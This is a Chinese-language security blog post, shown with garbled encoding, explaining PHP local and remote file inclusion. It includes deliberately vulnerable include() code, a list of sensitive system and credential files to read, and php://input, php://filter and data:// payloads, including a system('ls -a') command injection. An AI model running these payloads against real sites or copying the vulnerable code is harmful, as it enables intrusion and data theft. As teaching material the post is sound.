<!DOCTYPE html>
<html lang="en">

<head>

  <!-- Minima -->
  <!-- Hexo theme created by @adisaktijrs -->

  <!-- Basic Page Needs
  â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“ -->
  <meta charset="utf-8">

  
  <title>phpæ–‡ä»¶åŒ…å«æ¼æ´</title>
  
  <link rel="canonical" href="https://noname0519.com/2022/01/20/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/">
  
  <meta name="description" content="phpæ–‡ä»¶åŒ…å«æ¼æ´æè¿° å¼€å‘äººå‘˜ä¸ºäº†ä½¿å¾—ä»£ç æ›´çµæ´»ï¼Œä¼šå°†è¢«åŒ…å«çš„æ–‡ä»¶è®¾ç½®ä¸ºå˜é‡ï¼Œç”¨æ¥è¿›è¡ŒåŠ¨æ€è°ƒç”¨ï¼Œä»è€Œå¯¼è‡´å®¢æˆ·ç«¯å¯ä»¥æ¶æ„è°ƒç”¨ä¸€ä¸ªæ¶æ„æ–‡ä»¶ï¼Œé€ æˆæ–‡ä»¶åŒ…å«æ¼æ´  ç›¸å…³å‡½æ•°1234include()include_once()require()require_once()  include å’Œ requi">
  
  
  <meta name="author" content="Noname">
  
  <meta property="og:image" content="https://noname0519.comundefined">
  
  <meta property="og:site_name" content="Noname&#39;s Homepage" />
  <meta property="og:type" content="article" />
  <meta property="og:title" content="phpæ–‡ä»¶åŒ…å«æ¼æ´" />
  
  <meta property="og:description" content="phpæ–‡ä»¶åŒ…å«æ¼æ´æè¿° å¼€å‘äººå‘˜ä¸ºäº†ä½¿å¾—ä»£ç æ›´çµæ´»ï¼Œä¼šå°†è¢«åŒ…å«çš„æ–‡ä»¶è®¾ç½®ä¸ºå˜é‡ï¼Œç”¨æ¥è¿›è¡ŒåŠ¨æ€è°ƒç”¨ï¼Œä»è€Œå¯¼è‡´å®¢æˆ·ç«¯å¯ä»¥æ¶æ„è°ƒç”¨ä¸€ä¸ªæ¶æ„æ–‡ä»¶ï¼Œé€ æˆæ–‡ä»¶åŒ…å«æ¼æ´  ç›¸å…³å‡½æ•°1234include()include_once()require()require_once()  include å’Œ requi">
  
  <meta property="og:url" content="https://noname0519.com/2022/01/20/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" />

  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:title" content="phpæ–‡ä»¶åŒ…å«æ¼æ´">
  
  <meta name="twitter:description" content="phpæ–‡ä»¶åŒ…å«æ¼æ´æè¿° å¼€å‘äººå‘˜ä¸ºäº†ä½¿å¾—ä»£ç æ›´çµæ´»ï¼Œä¼šå°†è¢«åŒ…å«çš„æ–‡ä»¶è®¾ç½®ä¸ºå˜é‡ï¼Œç”¨æ¥è¿›è¡ŒåŠ¨æ€è°ƒç”¨ï¼Œä»è€Œå¯¼è‡´å®¢æˆ·ç«¯å¯ä»¥æ¶æ„è°ƒç”¨ä¸€ä¸ªæ¶æ„æ–‡ä»¶ï¼Œé€ æˆæ–‡ä»¶åŒ…å«æ¼æ´  ç›¸å…³å‡½æ•°1234include()include_once()require()require_once()  include å’Œ requi">
  
  
  <meta name="twitter:image" content="https://noname0519.comundefined">
  
  <meta name="twitter:url" content="https://noname0519.com/2022/01/20/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" />

  <!-- Mobile Specific Metas
  â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“ -->
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <!-- Preload fonts
  â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“ -->
  <link rel="preload" href="../fonts/dm-serif-display-v4-latin-regular.woff2" as="font" type="font/woff2" crossorigin>
  <link rel="preload" href="../fonts/inter-v2-latin-regular.woff2" as="font" type="font/woff2" crossorigin>

  <!-- CSS
  â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“ -->
  
<link rel="stylesheet" href="/css/normalize.css">

  
<link rel="stylesheet" href="/css/skeleton.css">

  
<link rel="stylesheet" href="/css/custom.css">

  
<link rel="stylesheet" href="/css/prism-dark.css">

  
<link rel="stylesheet" href="/css/prism-line-numbers.css">

  <!-- User css -->
  
  
<link rel="stylesheet" href="/css/user.css">

  

  <!-- Favicon
  â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“ -->
  <link rel="icon" type="image/png" href="/images/favicon.png">

  <!-- Custom Theme Color Style
  â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“ -->
  <style>
  a:not(.icon) {
    text-decoration-color: #0FA0CE;
    background-image: linear-gradient(
      to bottom,
      rgba(0, 0, 0, 0) 50%,
      #0FA0CE 50%
    );
  }
  blockquote {
    border-left: 8px solid #0FA0CE;
  }
  .nanobar .bar {
    background: #0FA0CE;
  }
  .button.button-primary:hover,
  button.button-primary:hover,
  input[type="submit"].button-primary:hover,
  input[type="reset"].button-primary:hover,
  input[type="button"].button-primary:hover,
  .button.button-primary:focus,
  button.button-primary:focus,
  input[type="submit"].button-primary:focus,
  input[type="reset"].button-primary:focus,
  input[type="button"].button-primary:focus {
    background-color: #0FA0CE;
    border-color: #0FA0CE;
  }
  input[type="email"]:focus,
  input[type="number"]:focus,
  input[type="search"]:focus,
  input[type="text"]:focus,
  input[type="tel"]:focus,
  input[type="url"]:focus,
  input[type="password"]:focus,
  textarea:focus,
  select:focus {
    border: 1px solid #0FA0CE;
  }
</style>

  <!-- Google Analytics (With Privacy Settings On)
  â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“ -->
  

<meta name="generator" content="Hexo 6.0.0"></head>

<body>
  <div class="container">
    <div class="row">
      <div>

        <div class="row">
  <div class="two columns" style="max-width: 50px">
    <h1 class="mt-2 mode">
      <div onclick=setDarkMode(true) id="darkBtn">ğŸŒ‘</div>
      <div onclick=setDarkMode(false) id="lightBtn" class=hidden>â˜€ï¸</div>
      <script >
        if (localStorage.getItem('preferredTheme') == 'dark') {
          setDarkMode(true)
        }
        function setDarkMode(isDark) {
          var darkBtn = document.getElementById('darkBtn')
          var lightBtn = document.getElementById('lightBtn')
          if (isDark) {
            lightBtn.style.display = "block"
            darkBtn.style.display = "none"
            localStorage.setItem('preferredTheme', 'dark');
          } else {
            lightBtn.style.display = "none"
            darkBtn.style.display = "block"
            localStorage.removeItem('preferredTheme');
          }
          document.body.classList.toggle("darkmode");
        }
      </script>
    </h1>
  </div>

  <div class="six columns ml-1">
    <h1 class="mt-2">
      Hi Folks.
    </h1>
  </div>

  <div class="twelve columns">
    <div class="row">
      <div class="nine columns left">
        <a href="/">Home</a>
        
          
          <a href="/Works" class="ml">Works</a>
          
        
          
          <a href="/About" class="ml">About</a>
          
        
        
          
            <a href="mailto:noname0519@outlook.com" target="_blank" class="ml">Email</a>
          
        
      </div>
    </div>
    <hr style="margin-bottom: 2.6rem">
  </div>
</div>

        <div class="trans">
            <h2>phpæ–‡ä»¶åŒ…å«æ¼æ´</h2>

  <h1 id="phpæ–‡ä»¶åŒ…å«æ¼æ´"><a href="#phpæ–‡ä»¶åŒ…å«æ¼æ´" class="headerlink" title="phpæ–‡ä»¶åŒ…å«æ¼æ´"></a>phpæ–‡ä»¶åŒ…å«æ¼æ´</h1><h2 id="æè¿°"><a href="#æè¿°" class="headerlink" title="æè¿°"></a>æè¿°</h2><blockquote>
<p>å¼€å‘äººå‘˜ä¸ºäº†ä½¿å¾—ä»£ç æ›´çµæ´»ï¼Œä¼šå°†è¢«åŒ…å«çš„æ–‡ä»¶è®¾ç½®ä¸ºå˜é‡ï¼Œç”¨æ¥è¿›è¡ŒåŠ¨æ€è°ƒç”¨ï¼Œä»è€Œå¯¼è‡´å®¢æˆ·ç«¯å¯ä»¥æ¶æ„è°ƒç”¨ä¸€ä¸ªæ¶æ„æ–‡ä»¶ï¼Œé€ æˆæ–‡ä»¶åŒ…å«æ¼æ´</p>
</blockquote>
<h3 id="ç›¸å…³å‡½æ•°"><a href="#ç›¸å…³å‡½æ•°" class="headerlink" title="ç›¸å…³å‡½æ•°"></a>ç›¸å…³å‡½æ•°</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">include</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">include_once</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">require</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">require_once</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure>

<p>include å’Œ requireçš„åŒºåˆ«åœ¨äºï¼Œå¦‚æœåŒ…å«çš„æ–‡ä»¶æœ‰é”™è¯¯ï¼Œincludeä¼šç»§ç»­å¾€ä¸‹æ‰§è¡Œï¼Œå¦‚æœæ˜¯requireå°±ä¸ä¼š</p>
<h2 id="æœ¬åœ°åŒ…å«æ¼æ´-LFI"><a href="#æœ¬åœ°åŒ…å«æ¼æ´-LFI" class="headerlink" title="æœ¬åœ°åŒ…å«æ¼æ´(LFI)"></a>æœ¬åœ°åŒ…å«æ¼æ´(LFI)</h2><p>ä¸€ä¸ªphpinfo.txtèµ°å¤©ä¸‹</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    phpinfo();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&quot;phpinfo.txt&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>åªè¦æ–‡ä»¶å†…å®¹å¤åˆphpè¯­æ³•è§„èŒƒï¼Œé‚£ä¹ˆä»»ä½•æ‰©å±•åéƒ½å¯ä»¥è¢«phpè§£æ<br>åŒ…å«éphpè¯­æ³•è§„èŒƒåŸæ–‡ä»¶æ—¶ï¼Œå°†ä¼šæš´éœ²å…¶æºä»£ç </p>
<p>å…¸å‹çš„æ¼æ´ä»£ç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]; </span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>filenameæ²¡æœ‰è¿›è¡Œè¿‡æ»¤ï¼Œå¯ä»¥è¢«ç”¨æˆ·æ§åˆ¶<br>è¿™é‡Œå¯ä»¥ç»“åˆç›®å½•éå†æ¼æ´æŸ¥çœ‹æ•æ„Ÿä¿¡æ¯</p>
<h2 id="è¿œç¨‹æ–‡ä»¶åŒ…å«-RFI"><a href="#è¿œç¨‹æ–‡ä»¶åŒ…å«-RFI" class="headerlink" title="è¿œç¨‹æ–‡ä»¶åŒ…å«(RFI)"></a>è¿œç¨‹æ–‡ä»¶åŒ…å«(RFI)</h2><p>æ³¨ï¼šè¦ç¡®å®šphpæ˜¯å¦å·²ç»å¼€å¯è¿œç¨‹åŒ…å«åŠŸèƒ½(é»˜è®¤æ˜¯å…³é—­)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alow_url_include = On</span><br></pre></td></tr></table></figure>

<p>æ —å­ï¼š</p>
<p><a target="_blank" rel="noopener" href="http://www.text.comæ ¹ç›®å½•å­˜åœ¨phpinfo.txt/">www.text.comæ ¹ç›®å½•å­˜åœ¨phpinfo.txt</a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>])</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="http://www.text.com/?a=http://www.text.com/phpinfo.txt">www.text.com?a=http://www.text.com/phpinfo.txt</a></p>
<p>è‹¥æ–‡ä»¶ä¸å­˜åœ¨ï¼Œä¹Ÿå¯ä»¥é€šè¿‡è§‚å¯Ÿæš´éœ²å‡ºçš„è­¦å‘Š</p>
<h2 id="æ•æ„Ÿæ–‡ä»¶åˆ©ç”¨"><a href="#æ•æ„Ÿæ–‡ä»¶åˆ©ç”¨" class="headerlink" title="æ•æ„Ÿæ–‡ä»¶åˆ©ç”¨"></a>æ•æ„Ÿæ–‡ä»¶åˆ©ç”¨</h2><p>åˆ©ç”¨é‡ç‚¹ï¼šæ‰¾åˆ°å¯æ§çš„æ–‡ä»¶</p>
<p>å¯¹äºå¯æ‰§è¡Œçš„æ–‡ä»¶(åŒ…å«å¯æ‰§è¡Œphpä»£ç çš„æ–‡ä»¶ï¼Œä¸ä¸€å®šæ˜¯phpåç¼€)ï¼šå¯ä»¥ç›´æ¥åˆ©ç”¨æ–‡ä»¶åŒ…å«æ‰§è¡Œ<br>å¯¹äºä¸å¯æ‰§è¡Œçš„æ–‡ä»¶ï¼šå¯ä»¥åˆ©ç”¨æ–‡ä»¶åŒ…å«æŸ¥çœ‹å…¶å†…å®¹</p>
<p>Windowsç³»ç»Ÿï¼š</p>
<table>
<thead>
<tr>
<th>æ–‡ä»¶</th>
<th>å†…å®¹</th>
</tr>
</thead>
<tbody><tr>
<td>C:\boot.ini</td>
<td>ç³»ç»Ÿç‰ˆæœ¬</td>
</tr>
<tr>
<td>C:\windows\system32\intetsrv\MetaBase.xml</td>
<td>IISé…ç½®æ–‡ä»¶</td>
</tr>
<tr>
<td>C:\windows\repair\sam</td>
<td>å­˜å‚¨Windowsç³»ç»Ÿåˆæ¬¡å®‰è£…çš„å¯†ç </td>
</tr>
<tr>
<td>C:\Program Files\mysql\my.ini</td>
<td>Mysqlé…ç½®</td>
</tr>
<tr>
<td>C:\windows\mysql\data\mysql\user.MYD</td>
<td>Mysql root</td>
</tr>
<tr>
<td>C:\window\php.inis</td>
<td>phpé…ç½®ä¿¡æ¯</td>
</tr>
<tr>
<td>C:\windows\my.ini</td>
<td>Mysqlé…ç½®æ–‡ä»¶</td>
</tr>
</tbody></table>
<p>Unix&#x2F;Linuxç³»ç»Ÿï¼š</p>
<table>
<thead>
<tr>
<th>æ–‡ä»¶</th>
<th>å†…å®¹</th>
</tr>
</thead>
<tbody><tr>
<td>&#x2F;etc&#x2F;passwd</td>
<td></td>
</tr>
<tr>
<td>&#x2F;usr&#x2F;local&#x2F;app&#x2F;apache&#x2F;conf&#x2F;httpd.conf</td>
<td>apacheé»˜è®¤é…ç½®æ–‡ä»¶</td>
</tr>
<tr>
<td>&#x2F;usr&#x2F;local&#x2F;app&#x2F;apache&#x2F;conf&#x2F;extra&#x2F;httpd-vhosts.conf</td>
<td>è™šæ‹Ÿç½‘ç«™è®¾ç½®</td>
</tr>
<tr>
<td>&#x2F;usr&#x2F;local&#x2F;app&#x2F;php5&#x2F;lib&#x2F;php.ini</td>
<td>phpç›¸å…³è®¾ç½®</td>
</tr>
<tr>
<td>&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf</td>
<td>apacheé…ç½®æ–‡ä»¶</td>
</tr>
<tr>
<td>&#x2F;etc&#x2F;my.cnf</td>
<td>mysqlçš„é…ç½®æ–‡ä»¶</td>
</tr>
</tbody></table>
<h2 id="è¿œç¨‹åŒ…å«shell"><a href="#è¿œç¨‹åŒ…å«shell" class="headerlink" title="è¿œç¨‹åŒ…å«shell"></a>è¿œç¨‹åŒ…å«shell</h2><p>è‹¥ç›®æ ‡ä¸»æœº<code>allow_url_fopen</code>çš„é€‰é¡¹æ˜¯æ¿€æ´»çš„ï¼Œç„¶ååŒ…å«ä¸€å¥è¯æœ¨é©¬</p>
<blockquote>
<p>ï¼ˆ1ï¼‰ allow_url_fopen&#x3D;on<br>æœ¬é€‰é¡¹æ¿€æ´»äº†URLå½¢å¼çš„fopenå°è£…åè®®ä½¿å¾—å¯ä»¥è®¿é—®URLå¯¹è±¡ä¾‹å¦‚æ–‡ä»¶ï¼Œé»˜è®¤çš„å°è£…åè®®æä¾›ftpå’Œhttpåè®®æ¥è®¿é—®è¿œç¨‹æ–‡ä»¶ï¼Œä¸€äº›æ‰©å±•åº“ä¾‹å¦‚zlibå¯èƒ½ä¼šæ³¨å†Œæ›´å¤šçš„å°è£…åè®®<br>ï¼ˆ2ï¼‰ allow_url_include&#x3D;on<br>This option allows the use of URL-aware fopen wrappers with the following functionsï¼š includeâ€¦</p>
</blockquote>
<p>?filename&#x3D;ä½ çš„è¿œç¨‹æ–‡ä»¶è·¯å¾„<br>è¿œç¨‹æ–‡ä»¶ä¸­çš„phpä»£ç ä¼šè¢«è§£æ<br>è‹¥åç¼€åå†™æ­»äº†ï¼Œå¯ä»¥ç”¨?ç»•è¿‡</p>
<h2 id="ä¼ªåè®®"><a href="#ä¼ªåè®®" class="headerlink" title="ä¼ªåè®®"></a>ä¼ªåè®®</h2><ul>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.file.php">file:&#x2F;&#x2F;</a> â€” è®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿ</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.http.php">http:&#x2F;&#x2F;</a> â€” è®¿é—® HTTP(s) ç½‘å€</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.ftp.php">ftp:&#x2F;&#x2F;</a> â€” è®¿é—® FTP(s) URLs</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.php.php">php:&#x2F;&#x2F;</a> â€” è®¿é—®å„ä¸ªè¾“å…¥&#x2F;è¾“å‡ºæµï¼ˆI&#x2F;O streamsï¼‰</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.compression.php">zlib:&#x2F;&#x2F;</a> â€” å‹ç¼©æµ</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.data.php">data:&#x2F;&#x2F;</a> â€” æ•°æ®ï¼ˆRFC 2397ï¼‰</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.glob.php">glob:&#x2F;&#x2F;</a> â€” æŸ¥æ‰¾åŒ¹é…çš„æ–‡ä»¶è·¯å¾„æ¨¡å¼</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.phar.php">phar:&#x2F;&#x2F;</a> â€” PHP å½’æ¡£</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.ssh2.php">ssh2:&#x2F;&#x2F;</a> â€” Secure Shell 2</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.rar.php">rar:&#x2F;&#x2F;</a> â€” RAR</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.audio.php">ogg:&#x2F;&#x2F;</a> â€” éŸ³é¢‘æµ</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.expect.php">expect:&#x2F;&#x2F;</a> â€” å¤„ç†äº¤äº’å¼çš„æµ</li>
</ul>
<h3 id="php-x2F-x2F-input"><a href="#php-x2F-x2F-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h3><p>ä»£è¡¨å¯ä»¥è®¿é—®è¯·æ±‚çš„åŸå§‹æ•°æ®ï¼Œå¯ä»¥è·å–åˆ°postçš„æ•°æ®å¹¶å°†å…¶ä½œä¸ºphpä»£ç æ‰§è¡Œ</p>
<p>æ¡ä»¶ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen: off/on</span><br><span class="line"></span><br><span class="line">allow_url_include: on</span><br><span class="line">index.php?file=php:<span class="comment">//input</span></span><br><span class="line">POST:</span><br><span class="line"><span class="meta">&lt;?</span> phpinfo(); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>åˆ©ç”¨</p>
<p>é‡åˆ°file_get_contents()å¯ä»¥åˆ©ç”¨è¯¥åè®®</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file_get_contents(&quot;php://input&quot;);</span><br><span class="line">POST:xxx</span><br></pre></td></tr></table></figure>

<p><strong>å†™æœ¨é©¬</strong></p>
<p>æ¡ä»¶ï¼šphpä¸­å¼€å¯allow_url_fopen å’Œ allow_url_includeï¼ˆPHP &lt; 5.3.0ï¼‰</p>
<p>POST: æœ¨é©¬</p>
<p><strong>å‘½ä»¤æ‰§è¡Œ</strong></p>
<p>POST:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> system(<span class="string">&#x27;ls -a&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="php-x2F-x2F-output"><a href="#php-x2F-x2F-output" class="headerlink" title="php:&#x2F;&#x2F;output"></a>php:&#x2F;&#x2F;output</h3><p>åªå†™çš„æ•°æ®æµ</p>
<h3 id="file"><a href="#file" class="headerlink" title="file:"></a>file:</h3><p>file:&#x2F;&#x2F;[ç»å¯¹è·¯å¾„åŠæ–‡ä»¶å]</p>
<p>è®¿é—®æœ¬åœ°æ–‡ä»¶</p>
<h3 id="php-x2F-x2F-filter"><a href="#php-x2F-x2F-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h3><p>ä¸€ç§å…ƒå°è£…å™¨ï¼Œè®¾è®¡ç”¨äºæ•°æ®æµæ‰“å¼€æ—¶çš„ç­›é€‰è¿‡æ»¤åº”ç”¨ï¼Œä¹Ÿå°±æ˜¯è¿‡æ»¤å™¨</p>
<p>å‚æ•°ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">resource=&lt;è¦è¿‡æ»¤çš„æ•°æ®æµ&gt; è¿™ä¸ªå‚æ•°æ˜¯å¿…é¡»çš„ã€‚å®ƒæŒ‡å®šäº†ä½ è¦ç­›é€‰è¿‡æ»¤çš„æ•°æ®æµã€‚</span><br><span class="line"></span><br><span class="line">read=&lt;è¯»é“¾çš„ç­›é€‰åˆ—è¡¨&gt; è¯¥å‚æ•°å¯é€‰ã€‚å¯ä»¥è®¾å®šä¸€ä¸ªæˆ–å¤šä¸ªè¿‡æ»¤å™¨åç§°ï¼Œä»¥ç®¡é“ç¬¦ï¼ˆ|ï¼‰åˆ†éš”ã€‚</span><br><span class="line"></span><br><span class="line">write=&lt;å†™é“¾çš„ç­›é€‰åˆ—è¡¨&gt; è¯¥å‚æ•°å¯é€‰ã€‚å¯ä»¥è®¾å®šä¸€ä¸ªæˆ–å¤šä¸ªè¿‡æ»¤å™¨åç§°ï¼Œä»¥ç®¡é“ç¬¦ï¼ˆ|ï¼‰åˆ†éš”ã€‚</span><br><span class="line"></span><br><span class="line">&lt;ï¼›ä¸¤ä¸ªé“¾çš„ç­›é€‰åˆ—è¡¨&gt; ä»»ä½•æ²¡æœ‰ä»¥ read= æˆ– write= ä½œå‰ç¼€ çš„ç­›é€‰å™¨åˆ—è¡¨ä¼šè§†æƒ…å†µåº”ç”¨äºè¯»æˆ–å†™é“¾ã€‚</span><br></pre></td></tr></table></figure>

<p>å¸¸ç”¨çš„payloadï¼š</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="regexp">//</span>filter<span class="regexp">/read=convert.base64-encode/</span>resource=xxx.php</span><br><span class="line">php:<span class="regexp">//</span>filter<span class="regexp">/convert.base64-encode/</span>resource=/flag</span><br><span class="line">php:<span class="regexp">//</span>filter<span class="regexp">/write=convert.base64-decode/</span>resource=xxx.php </span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå°±æ˜¯ä½¿ç”¨convert.base64-encodeè¿™ä¸ªè¿‡æ»¤å™¨ï¼Œå¯¹xxx.phpçš„å†…å®¹è¿›è¡Œbase64ç¼–ç åå†è¯»å–</p>
<p>è¿˜æœ‰å…¶ä»–ä¸€äº›å¥‡å¦™çš„ç¼–ç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">stream_filter_append stream_filter_prepend</span><br><span class="line">ç»™æµæ·»åŠ è¿‡æ»¤å™¨ </span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html?page=2#reply-list">https://www.leavesongs.com/PENETRATION/php-filter-magic.html?page=2#reply-list</a></p>
<p><a target="_blank" rel="noopener" href="https://www.smi1e.top/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E4%B8%8Ephp%E4%BC%AA%E5%8D%8F%E8%AE%AE/">https://www.smi1e.top/æ–‡ä»¶åŒ…å«æ¼æ´ä¸phpä¼ªåè®®/</a></p>
<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/filters.php">https://www.php.net/manual/zh/filters.php</a></p>
<h3 id="data"><a href="#data" class="headerlink" title="data:"></a>data:</h3><p>data:èµ„æºç±»å‹;ç¼–ç ,å†…å®¹</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">data:<span class="comment">//text/plain,xxxxx</span></span><br><span class="line">data:text/plain,xxxxx</span><br><span class="line">data:<span class="comment">//text/plain;base64,xxxxx</span></span><br><span class="line">data:text/plain;base64,xxxxx </span><br></pre></td></tr></table></figure>

<h3 id="å‹ç¼©åŒ…ä¼ªåè®®"><a href="#å‹ç¼©åŒ…ä¼ªåè®®" class="headerlink" title="å‹ç¼©åŒ…ä¼ªåè®®"></a>å‹ç¼©åŒ…ä¼ªåè®®</h3><p>pchar:&#x2F;&#x2F;</p>
<p>zip:&#x2F;&#x2F;</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=zip://xxxxxx#phpinfo.php</span><br></pre></td></tr></table></figure>



<h2 id="ç»•è¿‡é™åˆ¶"><a href="#ç»•è¿‡é™åˆ¶" class="headerlink" title="ç»•è¿‡é™åˆ¶"></a>ç»•è¿‡é™åˆ¶</h2><h3 id="æˆªæ–­"><a href="#æˆªæ–­" class="headerlink" title="æˆªæ–­"></a>æˆªæ–­</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span>,<span class="string">&quot;.html&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

